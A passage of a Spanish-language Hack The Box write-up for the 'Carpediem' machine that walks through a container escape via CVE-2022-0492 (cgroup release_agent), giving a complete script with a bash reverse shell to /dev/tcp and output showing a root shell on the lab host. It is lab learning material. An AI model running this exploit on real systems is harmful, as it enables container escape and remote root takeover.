<strong>cgroup</strong> com permisos de escritura, como nos encontramos en un contenedor no lo tenemos ya que necesitamos la <strong>capability CAP_SYS_ADMIN</strong></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">root@90c7f522b842:/#</span><span class="w"> </span><span class="nb">set</span> <span class="sb">`</span><span class="nb">cat</span> /proc/<span class="nv">$$</span>/status | <span class="nb">grep</span> <span class="s2">"CapEff:"</span><span class="sb">`</span><span class="p">;</span> capsh <span class="nt">--decode</span><span class="o">=</span><span class="nv">$2</span> | <span class="nb">grep </span>sys_admin
<span class="gp">root@90c7f522b842:/#</span><span class="w">
</span></pre></table></code></div></div><p>Para solucionar esto, como contenedores usamos <code class="language-plaintext highlighter-rouge">unshare</code> y <strong>creamos un nuevo espacio de nombres de usuario y cgroup</strong> para tener la capability y poder montar un sistema de archivos <strong>cgroup (cgroupfs)</strong></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">root@90c7f522b842:/#</span><span class="w"> </span>unshare <span class="nt">-UrmC</span> bash
<span class="gp">root@90c7f522b842:/#</span><span class="w"> </span><span class="nb">mkdir</span> /tmp/mountest <span class="o">&amp;&amp;</span> mount <span class="nt">-t</span> cgroup <span class="nt">-o</span> rdma cgroup /tmp/mountest <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> /tmp/mountest/x
</pre></table></code></div></div><blockquote class="prompt-warning"><div><p>Tengamos en cuenta que al hacer la montura, esta sea montada en el <strong>cgroup root</strong> (cat /proc/self/cgroup), ya que de esa manera podremos visualizar el archivo <em>release_agent</em></p></div></blockquote><p>Ahora tenemos que invocar la característica <em>notify_on_release</em></p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo </span>1 <span class="o">&gt;</span> /tmp/cgrp/x/notify_on_release
</pre></table></code></div></div><p>Luego asignamos el path donde colocaremos el archivo que ejecutaremos <em>/cmd</em></p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">host_path</span><span class="o">=</span><span class="sb">`</span><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s/.*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab<span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$host_path</span><span class="s2">/cmd"</span> <span class="o">&gt;</span> /tmp/cgrp/release_agent
</pre></table></code></div></div><p>Ahora solo escribimos los comando que queremos ejecutar en el archivo</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'#!/bin/sh'</span> <span class="o">&gt;</span> /cmd
<span class="nb">echo</span> <span class="s2">"id &gt; </span><span class="nv">$host_path</span><span class="s2">/output"</span> <span class="o">&gt;&gt;</span> /cmd
<span class="nb">chmod </span>a+x /cmd
</pre></table></code></div></div><p>Por último solo creamos un proceso que termine al mismo instante para así llamar al archivo <em>release_agent</em> y ejecutar nuestro archivo <em>/cmd</em></p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sh <span class="nt">-c</span> <span class="s2">"echo </span><span class="se">\$\$</span><span class="s2"> &gt; /tmp/cgrp/x/cgroup.procs"</span>
</pre></table></code></div></div><p>Podemos juntar todo en un script y ejecutarlo:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>

<span class="c"># unshare -UrmC bash</span>
<span class="nb">mkdir</span> /tmp/.privesc
<span class="nb">mkdir</span> /tmp/.privesc/mountest
mount <span class="nt">-t</span> cgroup <span class="nt">-o</span> rdma cgroup /tmp/.privesc/mountest
<span class="nb">mkdir</span> /tmp/.privesc/mountest/x
<span class="nb">echo </span>1 <span class="o">&gt;</span> /tmp/.privesc/mountest/x/notify_on_release
<span class="nv">host_path</span><span class="o">=</span><span class="sb">`</span><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s/.*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab<span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$host_path</span><span class="s2">/cmd"</span> <span class="o">&gt;</span> /tmp/mountest/release_agent
<span class="nb">echo</span> <span class="s1">'#!/bin/sh'</span> <span class="o">&gt;</span> /cmd
<span class="nb">echo</span> <span class="s2">"bin/bash -c 'bash -i &gt;&amp; /dev/tcp/</span><span class="nv">$1</span><span class="s2">/</span><span class="nv">$2</span><span class="s2"> 0&gt;&amp;1'"</span> <span class="o">&gt;&gt;</span> /cmd
<span class="nb">chmod </span>a+x /cmd

sh <span class="nt">-c</span> <span class="s2">"echo </span><span class="se">\$\$</span><span class="s2"> &gt; /tmp/.privesc/mountest/x/cgroup.procs"</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Carpediem/CVE-2022-0492/cve-2022-0492.sh">https://github.com/E1P0TR0</a></p></div></blockquote><p>Finalmente somo usuarios <code class="language-plaintext highlighter-rouge">root</code> de la máquina <code class="language-plaintext highlighter-rouge">10.10.11.167</code> y conseguimos la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="gp">root@90c7f522b842:/tmp#</span><span class="w"> </span>./CVE-2022-0492.sh 10.10.14.62 6666
<span class="gp">root@90c7f522b842:/tmp#</span><span class="w"> 
</span><span class="go">
───────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 6666
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 10.10.11.167.
Ncat: Connection from 10.10.11.167:40250.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">root@carpediem:/#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">whoami
root
</span><span class="gp">root@carpediem:/#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">find / -name root.txt | xargs ls -l
-rw-r----- 1 root root 33 Sep  6 04:48 /root/root.txt
</span><span class="gp">root@carpediem:/#</span><span class="w">
</span></pre></table></code></div></div><blockquote><p>Aquí tienes mas información sobre <strong>CVE-2022-0492</strong>:</p><p><a href="https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/">https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/</a></p><p><a href="https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/">https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/</a></p><p><a href="https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1">https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1</a></p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/hard/" class="post-tag no-text-decoration" >Hard</a> <a href="/tags/mongodb/" class="post-tag no-text-decoration" >MongoDB</a> <a href="/tags/pivoting/" class="post-tag no-text-decoration" >Pivoting</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a> <a href="/tags/bash-scripting/" class="post-tag no-text-decoration" >Bash Scripting</a> <a href="/tags/javascript-scripting/" class="post-tag no-text-decoration" >Javascript Scripting</a> <a href="/tags/capabilities/" class="post-tag no-text-decoration" >Capabilities</a> <a href="/tags/cve-2021-45268/" class="post-tag no-text-decoration" >CVE-2021-45268</a> <a href="/tags/cve-2022-0492/" class="post-tag no-text-decoration" >CVE-2022-0492</a> <a href="/tags/information-leakage/" class="post-tag no-text-decoration" >Information Leakage</a> <a href="/tags/voip-system/" class="post-tag no-text-decoration" >VoIP System</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Carpediem - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBCarpediem/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Carpediem - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBCarpediem/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBCarpediem/&amp;text=Hackthebox Writeup Carpediem - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBOpensource/"><div class="card-body"> <em class="timeago small" data-ts="1656392833" > 2022-06-28 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Opensource</h3><div class="text-muted small"><p> Entorno Linux con una aplicación en un servidor web con Python que permitía en uno de sus archivos implementar una funcionalidad agregando una nueva ruta para explotar RCE (Remote code execution) a...</p></div></div></a></div><div class="card"> <a href="/posts/HTBNoter/"><div class="card-body"> <em class="timeago small" data-ts="1657962497" > 2022-07-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Noter</h3><div class="text-muted small"><p> Overview: User validation by Error Messages in Login process. Brute force default Flask’s Session Management. User passwords, Backup code, database credentials by Information Leakage. Rem...</p></div></div></a></div><div class="card"> <a href="/posts/HTBSnoopy/"><div class="card-body"> <em class="timeago small" data-ts="1695229200" > 2023-09-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Snoopy Report</h3><div class="text-muted small"><p> Information gathering Scope: 10.10.11.212/32 (Linux) TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenS...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBShared/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Shared</p></a> <a href="/posts/HTBTrick/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Trick</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
